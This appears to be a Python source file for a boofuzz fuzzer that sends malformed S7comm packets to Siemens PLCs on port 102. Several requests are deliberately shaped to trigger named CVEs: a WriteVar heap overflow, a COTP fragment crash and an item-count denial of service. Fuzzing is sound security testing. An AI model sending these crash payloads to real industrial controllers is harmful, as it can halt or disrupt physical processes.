"""S7comm (Siemens S7 Communication) Protocol Fuzzer

S7comm is the ISO-on-TCP application protocol spoken by Siemens S7-300/400/1200/
1500 PLCs (and the snap7 open-source stack). It rides on the same TPKT/COTP
transport as MMS (TCP port 102).

Framing (all multi-byte fields big-endian):

    TPKT      : version 0x03, reserved 0x00, length (Word, whole-frame length)
    COTP (DT) : length byte, PDU-type 0xF0 (DT Data), TPDU-nr + EOT byte
                (0x80 = last-data-unit set; 0x00 = fragment continuation)
    S7comm    : protocol-id 0x32
                ROSCTR (1=Job, 2=Ack, 3=Ack-Data, 7=Userdata)
                redundancy-id (Word = 0)
                PDU-reference (Word)
                parameter-length (Word)
                data-length (Word)
                parameter { function byte
                            (0x04 ReadVar, 0x05 WriteVar,
                             0xF0 Setup-Communication/negotiate)
                            item-count byte
                            request items... }

This fuzzer targets known server-side memory-safety / DoS bug classes in S7comm
parsers that had ZERO fuzzer coverage in OIDA before:

  - CVE-2026-51218  heap overflow in TS7Worker::PerformFunctionWrite
                    (WriteVar item data-length larger than the bytes present)
  - CVE-2020-22552  COTP last-data-unit + WriteVar crash
                    (DT with EOT=0 fragment continuation then an incomplete WriteVar)
  - CVE-2017-1000230  ItemCount DoS
                    (ReadVar/WriteVar item-count byte inflated past the items present)

Gating is strict 1:1: every advertised RequestInfo name equals the boofuzz
Request node name it gates, so --enable / --disable select exactly one request.
"""

from typing import List

from boofuzz import Group, Request, Static

from oida.fuzz.core.base_fuzzer import BaseFuzzer, CommonState, RequestInfo
from oida.fuzz.core.config import FuzzerConfig, ProtocolType
from oida.fuzz.monitors import SocketHealthMonitor
from oida.fuzz.primitives.dynamic import SmartBytes

# A well-formed S7 ReadVar/WriteVar request item (ANY-pointer, 12 bytes):
# 0x12 spec-type, 0x0a length, 0x10 syntax-id (S7ANY), 0x02 transport-size (byte),
# 0x0001 element-count, 0x0000 db-number, 0x84 area (DB), 0x000000 start-address.
S7_ANY_ITEM = b"\x12\x0a\x10\x02\x00\x01\x00\x00\x84\x00\x00\x00"


class S7CommFuzzer(BaseFuzzer):
    """S7comm protocol fuzzer (ISO-on-TCP, TCP port 102).

    Eight requests spanning baseline / overflow / boundary / malformed:
      - S7Comm_Baseline                 (baseline)  valid Setup-Communication
      - S7Comm_ItemCount_Lie            (malformed) inflated item-count byte
      - S7Comm_WriteVar_DataLen_Overflow(overflow)  data-length > bytes present
      - S7Comm_COTP_LastDataUnit        (malformed) EOT=0 + incomplete WriteVar
      - S7Comm_ParamLen_DataLen_Lie     (boundary)  header param/data-length lies
      - S7Comm_TPKT_Length_Lie          (boundary)  TPKT length field lies
      - S7Comm_ROSCTR_Boundary          (boundary)  invalid ROSCTR/function bytes
      - S7Comm_Userdata_Malformed       (malformed) ROSCTR 7 + malformed SZL
    """

    # Protocol-specific monitor interval mirrors iec104 (check every 5 tests).
    # There is no S7comm health monitor, so use the socket monitor on port 102.
    DEFAULT_MONITORS = "socket:5"

    PROTOCOL_OPTIONS = {
        "pdu_reference": {
            "type": int,
            "default": 1,
            "description": "Starting S7comm PDU reference number",
            "example": "1024",
        },
    }

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Static request definitions for --list-requests.

        Names here are 1:1 with the boofuzz Request nodes wired in
        _define_protocol(), so --enable/--disable select exactly one request.
        """
        return [
            RequestInfo(
                "S7Comm_Baseline",
                "Valid Setup-Communication negotiate PDU (connectivity baseline)",
                "baseline",
                requires_state=CommonState.CONNECTED,
            ),
            RequestInfo(
                "S7Comm_ItemCount_Lie",
                "ReadVar item-count byte inflated past items present (CVE-2017-1000230)",
                "malformed",
                requires_state=CommonState.ANY,
            ),
            RequestInfo(
                "S7Comm_WriteVar_DataLen_Overflow",
                "WriteVar data-length larger than bytes present (CVE-2026-51218 heap overflow)",
                "overflow",
                requires_state=CommonState.ANY,
            ),
            RequestInfo(
                "S7Comm_COTP_LastDataUnit",
                "COTP DT EOT=0 fragment then an incomplete WriteVar (CVE-2020-22552)",
                "malformed",
                requires_state=CommonState.ANY,
            ),
            RequestInfo(
                "S7Comm_ParamLen_DataLen_Lie",
                "S7 header parameter-length/data-length lie vs actual body",
                "boundary",
                requires_state=CommonState.ANY,
            ),
            RequestInfo(
                "S7Comm_TPKT_Length_Lie",
                "TPKT length field lie vs actual frame length",
                "boundary",
                requires_state=CommonState.ANY,
            ),
            RequestInfo(
                "S7Comm_ROSCTR_Boundary",
                "ROSCTR and function byte over invalid values",
                "boundary",
                requires_state=CommonState.ANY,
            ),
            RequestInfo(
                "S7Comm_Userdata_Malformed",
                "ROSCTR 7 Userdata with malformed SZL param/subfunction",
                "malformed",
                requires_state=CommonState.ANY,
            ),
        ]

    def __init__(self, config: FuzzerConfig, connection_factory=None):
        config.protocol_type = ProtocolType.TCP
        if not config.target_port:
            config.target_port = 102
        super().__init__(config, connection_factory)

    def setup_custom_monitors(self):
        """Socket health monitor on the ISO-TSAP port (102)."""
        return [
            SocketHealthMonitor(
                self.config.target_ip,
                self.config.target_port or 102,
                retry_count=3,
                timeout=5,
            )
        ]

    def _define_protocol(self):
        """Wire the eight S7comm requests, each gated 1:1 by its advertised name."""
        if self.is_request_enabled("S7Comm_Baseline"):
            self._add_baseline()
        if self.is_request_enabled("S7Comm_ItemCount_Lie"):
            self._add_item_count_lie()
        if self.is_request_enabled("S7Comm_WriteVar_DataLen_Overflow"):
            self._add_writevar_datalen_overflow()
        if self.is_request_enabled("S7Comm_COTP_LastDataUnit"):
            self._add_cotp_last_data_unit()
        if self.is_request_enabled("S7Comm_ParamLen_DataLen_Lie"):
            self._add_paramlen_datalen_lie()
        if self.is_request_enabled("S7Comm_TPKT_Length_Lie"):
            self._add_tpkt_length_lie()
        if self.is_request_enabled("S7Comm_ROSCTR_Boundary"):
            self._add_rosctr_boundary()
        if self.is_request_enabled("S7Comm_Userdata_Malformed"):
            self._add_userdata_malformed()

    # ------------------------------------------------------------------ #
    # Individual requests (each Request name == its RequestInfo name)
    # ------------------------------------------------------------------ #

    def _add_baseline(self):
        """Well-formed S7 Setup-Communication (negotiate) over COTP DT.

        TPKT(4) + COTP(3) + S7 header(10) + setup param(8) = 25 (0x19) bytes.
        Setup param: func 0xF0, reserved 0x00, max-AmQ-calling 0x0001,
        max-AmQ-called 0x0001, PDU-length 0x03C0. data-length = 0.
        """
        self.session.connect(
            Request(
                "S7Comm_Baseline",
                children=(
                    Static("tpkt", b"\x03\x00\x00\x19"),
                    Static("cotp", b"\x02\xf0\x80"),
                    # proto 0x32, ROSCTR 0x01 Job, redundancy 0x0000, pdu-ref 0x0000,
                    # param-len 0x0008, data-len 0x0000
                    Static("s7_header", b"\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00"),
                    Static("s7_setup_param", b"\xf0\x00\x00\x01\x00\x01\x03\xc0"),
                ),
            )
        )

    def _add_item_count_lie(self):
        """ReadVar Job whose item-count byte lies about how many items follow.

        Exactly one 12-byte ANY item is present, but the item-count byte claims
        0xFF / 0x7F items (CVE-2017-1000230 ItemCount DoS). The inflated value
        0xFF is first in the Group so the default render carries the lie.
        param-len = func(1) + count(1) + item(12) = 14 (0x000E).
        """
        self.session.connect(
            Request(
                "S7Comm_ItemCount_Lie",
                children=(
                    Static("tpkt", b"\x03\x00\x00\x1f"),
                    Static("cotp", b"\x02\xf0\x80"),
                    # proto, ROSCTR Job, redundancy 0x0000, pdu-ref 0x0001
                    Static("s7_header_pre", b"\x32\x01\x00\x00\x00\x01"),
                    Static("param_len", b"\x00\x0e"),
                    Static("data_len", b"\x00\x00"),
                    Static("read_func", b"\x04"),
                    # LIE: claim many items while only one is present (0xFF first)
                    Group("item_count", values=[b"\xff", b"\x7f", b"\x00"]),
                    Static("read_item", S7_ANY_ITEM),
                ),
            )
        )

    def _add_writevar_datalen_overflow(self):
        """WriteVar whose header data-length and item data-length exceed the payload.

        A WriteVar carries a data section (return-code, transport-size, length,
        data) after the item spec. Here the S7 header data-length and the item's
        length word both claim up to 0xFFFF while only two payload bytes are
        present -> the classic WriteVar heap-overflow shape
        (CVE-2026-51218, TS7Worker::PerformFunctionWrite).
        """
        self.session.connect(
            Request(
                "S7Comm_WriteVar_DataLen_Overflow",
                children=(
                    Static("tpkt", b"\x03\x00\x00\x25"),
                    Static("cotp", b"\x02\xf0\x80"),
                    # proto, ROSCTR Job, redundancy 0x0000, pdu-ref 0x0002
                    Static("s7_header_pre", b"\x32\x01\x00\x00\x00\x02"),
                    Static("param_len", b"\x00\x0e"),
                    # LIE: S7 header data-length far larger than the bytes present
                    Group("data_len", values=[b"\xff\xff", b"\x7f\xff", b"\x00\x08"]),
                    Static("write_func_count", b"\x05\x01"),
                    Static("write_item_spec", S7_ANY_ITEM),
                    # data item: return-code 0x00, transport-size 0x04 (byte)
                    Static("data_item_head", b"\x00\x04"),
                    # LIE: item data-length word much larger than the 2 payload bytes
                    Group("item_data_len", values=[b"\xff\xff", b"\x7f\xff", b"\x00\x40"]),
                    SmartBytes(
                        "write_payload", default_value=b"\x00\x01", max_len=8, fuzzable=True
                    ),
                ),
            )
        )

    def _add_cotp_last_data_unit(self):
        """COTP DT with the EOT (last-data-unit) bit cleared, then an incomplete WriteVar.

        The COTP TPDU-nr+EOT byte is 0x00 (fragment continuation) instead of
        0x80, and the WriteVar declares a data section (never delivered) -> the
        server waits on / mishandles the continuation (CVE-2020-22552).
        param-len = func(1) + count(1) + item(12) = 14 (0x000E); the declared
        data section is absent.
        """
        self.session.connect(
            Request(
                "S7Comm_COTP_LastDataUnit",
                children=(
                    Static("tpkt", b"\x03\x00\x00\x1f"),
                    Static("cotp_len_dt", b"\x02\xf0"),
                    # EOT bit cleared (0x00) = NOT last data unit; 0x80 is the valid case
                    Group("cotp_eot", values=[b"\x00", b"\x80"]),
                    # header declares param-len 0x000E, data-len 0x0000
                    Static("s7_header", b"\x32\x01\x00\x00\x00\x03\x00\x0e\x00\x00"),
                    Static("write_func_count", b"\x05\x01"),
                    # WriteVar item spec but no data section -> request never completes
                    Static("write_item_spec", S7_ANY_ITEM),
                ),
            )
        )

    def _add_paramlen_datalen_lie(self):
        """S7 header parameter-length / data-length that disagree with the actual body.

        Groups both header length words over {0x0000, 0xFFFF, correct} while a
        real ReadVar body follows, exercising length-driven parsers.
        """
        self.session.connect(
            Request(
                "S7Comm_ParamLen_DataLen_Lie",
                children=(
                    Static("tpkt", b"\x03\x00\x00\x1f"),
                    Static("cotp", b"\x02\xf0\x80"),
                    # proto, ROSCTR Job, redundancy 0x0000, pdu-ref 0x0004
                    Static("s7_header_pre", b"\x32\x01\x00\x00\x00\x04"),
                    # LIE: zero / max / correct(0x000E) parameter-length
                    Group("param_len", values=[b"\x00\x00", b"\xff\xff", b"\x00\x0e"]),
                    # LIE: zero / max / mismatched data-length
                    Group("data_len", values=[b"\x00\x00", b"\xff\xff", b"\x00\x40"]),
                    Static("read_func_count", b"\x04\x01"),
                    Static("read_item", S7_ANY_ITEM),
                ),
            )
        )

    def _add_tpkt_length_lie(self):
        """TPKT length field that disagrees with the real frame length.

        Real frame is 25 bytes, but the TPKT length Word is fuzzed over
        {0x0000, 0x0004, 0xFFFF} to test framing/length handling.
        """
        self.session.connect(
            Request(
                "S7Comm_TPKT_Length_Lie",
                children=(
                    Static("tpkt_ver", b"\x03\x00"),
                    # LIE: TPKT length vs the actual 25-byte frame
                    Group("tpkt_len", values=[b"\x00\x00", b"\x00\x04", b"\xff\xff"]),
                    Static("cotp", b"\x02\xf0\x80"),
                    # full Setup-Communication PDU (proto..setup param), pdu-ref 0x0005
                    Static(
                        "s7_setup",
                        b"\x32\x01\x00\x00\x00\x05\x00\x08\x00\x00\xf0\x00\x00\x01\x00\x01\x03\xc0",
                    ),
                ),
            )
        )

    def _add_rosctr_boundary(self):
        """ROSCTR and function byte driven over invalid / reserved values.

        ROSCTR is fuzzed over {0x00, 0x03, 0x08, 0xFF, 0x01} and the parameter
        function byte over {0xF0, 0x04, 0x05, 0x00, 0xFF}. param-len = 0x0008
        (function byte + 7 trailing bytes).
        """
        self.session.connect(
            Request(
                "S7Comm_ROSCTR_Boundary",
                children=(
                    Static("tpkt", b"\x03\x00\x00\x19"),
                    Static("cotp", b"\x02\xf0\x80"),
                    Static("s7_proto", b"\x32"),
                    # invalid/reserved ROSCTR values (0x01 Job is the valid one)
                    Group("rosctr", values=[b"\x00", b"\x03", b"\x08", b"\xff", b"\x01"]),
                    # redundancy 0x0000, pdu-ref 0x0006, param-len 0x0008, data-len 0x0000
                    Static("s7_header_rest", b"\x00\x00\x00\x06\x00\x08\x00\x00"),
                    # function byte over valid + invalid opcodes
                    Group("function", values=[b"\xf0", b"\x04", b"\x05", b"\x00", b"\xff"]),
                    Static("setup_rest", b"\x00\x00\x01\x00\x01\x03\xc0"),
                ),
            )
        )

    def _add_userdata_malformed(self):
        """ROSCTR 7 Userdata with a malformed SZL subfunction / SZL-ID.

        Userdata parameter head 0x00 0x01 0x12, param-len 0x04, method 0x11,
        type/func-group 0x44 (request / CPU functions), subfunction fuzzed,
        sequence 0x00; data section: return-code 0xFF, transport-size 0x09,
        length 0x0004, SZL-ID fuzzed, SZL-index 0x0000.
        param-len = 0x0008, data-len = 0x0008.
        """
        self.session.connect(
            Request(
                "S7Comm_Userdata_Malformed",
                children=(
                    Static("tpkt", b"\x03\x00\x00\x21"),
                    Static("cotp", b"\x02\xf0\x80"),
                    # proto 0x32, ROSCTR 0x07 Userdata
                    Static("s7_proto_rosctr", b"\x32\x07"),
                    # redundancy 0x0000, pdu-ref 0x0007, param-len 0x0008, data-len 0x0008
                    Static("s7_header_rest", b"\x00\x00\x00\x07\x00\x08\x00\x08"),
                    # userdata param head 0x000112, param-len 0x04
                    Static("ud_param_head", b"\x00\x01\x12\x04"),
                    # method 0x11, type(4=req)/func-group(4=CPU) = 0x44
                    Static("ud_method_type", b"\x11\x44"),
                    # malformed SZL subfunction (0xFF invalid; 0x01 read is valid)
                    Group("ud_subfunction", values=[b"\xff", b"\x01", b"\x00"]),
                    Static("ud_seq", b"\x00"),
                    # data: return-code 0xFF, transport-size 0x09, length 0x0004
                    Static("ud_data_head", b"\xff\x09\x00\x04"),
                    # malformed SZL-ID
                    Group("szl_id", values=[b"\xff\xff", b"\x00\x11", b"\x0f\xff"]),
                    Static("szl_index", b"\x00\x00"),
                ),
            )
        )
